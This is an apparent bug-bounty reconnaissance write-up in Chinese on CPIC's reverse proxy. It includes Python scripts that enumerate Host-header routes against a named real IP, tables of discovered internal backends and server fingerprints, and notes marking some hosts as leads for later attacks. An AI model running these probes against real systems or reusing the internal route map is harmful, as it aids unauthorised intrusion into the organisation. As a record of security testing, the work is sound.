# ROT Proxy Host Header路由枚举与后端探测 (2026-05-16)

## 核心发现

CPIC太保SRC测试中，发现ROT Proxy (58.246.171.102 / service.cpic.com.cn) 支持**任意Host头路由**。通过发送不同的Host头，可以探测ROT代理背后的内部路由表。

## 探测技术

### 1. Host头枚举

```python
import socket, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

proxy_ip = "58.246.171.102"  # service.cpic.com.cn ROT

# 尝试内部主机名
internal_hosts = [
    "internal.cpic.com.cn", "intranet.cpic.com.cn",
    "dev.cpic.com.cn", "test.cpic.com.cn", "sit.cpic.com.cn",
    "uat.cpic.com.cn", "staging.cpic.com.cn",
    "gitlab.cpic.com.cn", "jenkins.cpic.com.cn",
    "k8s.cpic.com.cn", "kubernetes.cpic.com.cn",
    "api.cpic.com.cn", "openapi.cpic.com.cn",
]

for host in internal_hosts:
    s = socket.create_connection((proxy_ip, 443), timeout=3)
    ss = ctx.wrap_socket(s, server_hostname=host)
    req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    ss.sendall(req.encode())
    data = ss.recv(4096)
    ss.close()
    code = data.decode().split('\r\n')[0]
    # 502 = 后端存在但不可达; 403/404 = 路由存在; 无响应 = 无此路由
```

### 2. 响应差异分析

| Host头 | HTTP响应 | Content-Length | 含义 |
|--------|----------|----------------|------|
| `gitlab.cpic.com.cn` | 502 Bad Gateway | 0 | 后端存在但不可达 |
| `gwkf.cpic.com.cn` | 500 Internal Server Error | 144 | 后端存在，nginx错误 |
| `sxthd.cpic.com.cn` | 403 Forbidden | 198 | 后端存在，Apache响应 |
| `m2web.cpic.com.cn` | 403 Forbidden | 199 | 403标准页 |
| `oneft.cpic.com.cn` | 502 Bad Gateway | 0 | 后端离线 |
| `internal.cpic.com.cn` | (timeout) | - | 无此路由 |

**关键洞察**: 502 Bad Gateway = 路由存在但后端离线。403/其他 = 后端在线但拒绝访问。

### 3. 后端指纹识别

通过ROT代理访问不同Host头，比较响应头Server字段：

```python
# sxthd.cpic.com.cn 返回 "Server: Apache" (非ROT标准nginx)
# gwkf.cpic.com.cn 返回 "Server: nginx" (后端nginx)
# service.cpic.com.cn 自己返回标准ROT响应
```

## ROT Proxy路由表发现结果 (CPIC 2026-05-16)

| Host头 | 响应码 | Server | 后端状态 |
|---------|--------|--------|----------|
| www.cpic.com.cn | 200 | (空) | 在线 |
| property.cpic.com.cn | 301 | - | 重定向 |
| life.cpic.com.cn | 301 | - | 重定向 |
| asset.cpic.com.cn | 301 | - | 重定向 |
| one.cpic.com.cn | 200 | nginx | ROT自己 |
| service.cpic.com.cn | 301 | - | 重定向 |
| api.cpic.com.cn | 200 | nginx | 在线 |
| open.cpic.com.cn | 403 | nginx | 拒绝访问 |
| ecpic.com.cn | (空) | - | 无路由 |
| m2web.cpic.com.cn | 403 | nginx | 拒绝访问 |
| health.cpic.com.cn | 301 | - | 重定向 |
| ssp.cpic.com.cn | 403 | nginx | 拒绝访问 |
| sxthd.cpic.com.cn | 403 | **Apache** | 特殊后端! |
| gwkf.cpic.com.cn | 403 | nginx | 拒绝访问 |
| oneft.cpic.com.cn | 502 | - | **后端离线** |
| onesit.cpic.com.cn | (空) | - | 无路由 |
| wwwsit.cpic.com.cn | (空) | - | 无路由 |
| bfypoc-dev.cpic.com.cn | (空) | - | 无路由 |
| bfylj.cpic.com.cn | 502 | - | **后端离线** |

## 高价值发现

### 后端服务离线 (502 Bad Gateway)

- `oneft.cpic.com.cn` → 502 后端离线
- `bfylj.cpic.com.cn` (理赔系统) → 502 后端离线

**攻击价值**: 后端离线说明有路由配置但服务未部署。可用于确认内部系统名称，供后续攻击参考。

### 特殊后端 (非ROT响应)

- `sxthd.cpic.com.cn` → Server: Apache (ROT集群之外的独立Apache后端)
- `gwkf.cpic.com.cn` → Server: nginx (不同的后端nginx)

**攻击价值**: 这些是ROT代理配置的真实后端服务器，而非ROT集群节点。可能存在独立的漏洞。

## 安全测试要点

1. **502 Bad Gateway ≠ 无漏洞** — 只能说明后端当前离线，不代表后端有漏洞
2. **403 + 不同Server头** — 后端在线且有独立响应，值得深入测试
3. **Host头路由** — ROT代理通常校验域名白名单，但Host头本身不过滤
4. **内网IP作为Host头** — 测试无效，因为ROT基于域名路由表，非IP直接路由

## Python探测脚本模板

```python
import socket, ssl, concurrent.futures

def check_rot_route(proxy_ip, host, timeout=5):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        s = socket.create_connection((proxy_ip, 443), timeout=timeout)
        ss = ctx.wrap_socket(s, server_hostname=host)
        req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        ss.sendall(req.encode())
        data = b""
        while True:
            try:
                chunk = ss.recv(4096)
                if not chunk: break
                data += chunk
            except: break
        ss.close()
        text = data.decode('utf-8', errors='replace')
        code = text.split('\r\n')[0]
        server = ""
        for line in text.split('\r\n'):
            if line.lower().startswith('server:'):
                server = line.split(':', 1)[1].strip()
        cl = 0
        for line in text.split('\r\n'):
            if line.lower().startswith('content-length:'):
                cl = int(line.split(':')[1].strip())
        return code, server, cl, len(data)
    except Exception as e:
        return f"ERROR: {e}", "", 0, 0

# 使用示例
proxy = "58.246.171.102"
hosts = ["gitlab.cpic.com.cn", "jenkins.cpic.com.cn", "k8s.cpic.com.cn", "api.cpic.com.cn"]
for host in hosts:
    code, server, cl, total = check_rot_route(proxy, host)
    print(f"{host}: {code} server={server} len={total}")
```
